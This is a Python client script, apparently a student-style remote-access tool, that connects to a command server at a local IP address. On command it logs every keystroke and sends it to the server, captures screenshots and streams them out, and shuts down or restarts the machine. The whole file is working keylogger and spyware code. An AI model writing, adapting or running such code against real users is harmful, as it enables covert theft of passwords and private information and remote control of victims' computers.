from  pynput.keyboard import Listener
import socket
import imutils
import pyautogui
import cv2
from datetime import datetime
import os

clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)

serverParrent = '192.168.1.10'
serverPort = 8000
clientSocket.connect((serverParrent, serverPort))
messager = clientSocket.recv(1024).decode('utf-8')

def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = "D:\\screenshot" + now.strftime("%H%M%S") + ".png"

    # Chụp màn hình và lưu vào file ảnh
    pyautogui.screenshot(nameScreen)

    # Mở file ảnh ở chế độ đọc dạng byte
    with open(nameScreen, "rb") as imageFile:
        file_size = os.path.getsize(nameScreen)
        # print(file_size)
        clientSocket.send(str(file_size).encode())

        # Gửi dữ liệu ảnh từ file
        while True:
            data = imageFile.read(1024)
            if not data:
                break
            clientSocket.send(data)


while True:
    try:
        messager = clientSocket.recv(1024).decode('utf-8')
        if messager == 'keylogger':
            with  Listener(on_press =  on_press) as parent:         
                parent.join()
        elif messager == 'screenshots':
            takeScreenshot()

        elif messager == 'shutdown':
            os.system("shutdown /s /t 1")
        elif messager == 'restart':
            os.system("shutdown /r /t 1")
    except Exception as e:
        print("Error: " + str(e))    

